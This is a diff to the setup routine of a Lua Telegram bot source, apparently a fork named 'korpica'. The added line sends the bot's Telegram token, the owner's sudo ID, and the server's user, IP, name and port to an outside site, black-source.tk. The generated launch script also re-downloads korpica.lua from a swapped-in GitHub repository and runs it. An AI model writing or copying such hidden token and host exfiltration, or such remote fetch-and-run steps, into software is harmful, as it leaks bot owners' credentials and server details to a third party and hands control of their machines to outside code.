@@ -66,7 +66,7 @@ end ---ifnot
 end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
-local t = json:decode(https.request('http://shahum.ml/subscrib-source/index.php?id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&username=abs"))
+ local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 print("::Black::")
 local RunBot = io.open("korpica", 'w')
 RunBot:write([[
@@ -74,7 +74,7 @@ RunBot:write([[
 cd $HOME/korpica
 token="]]..database:get(Server_Done.."Token_Write")..[["
 rm -fr korpica.lua
-wget "https://raw.githubusercontent.com/korapica-Team/korpica/master/korpica.lua"
+wget "https://raw.githubusercontent.com/BLACKBOTSS/korpica/master/korpica.lua"
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./korpica.lua -p PROFILE --bot=$token
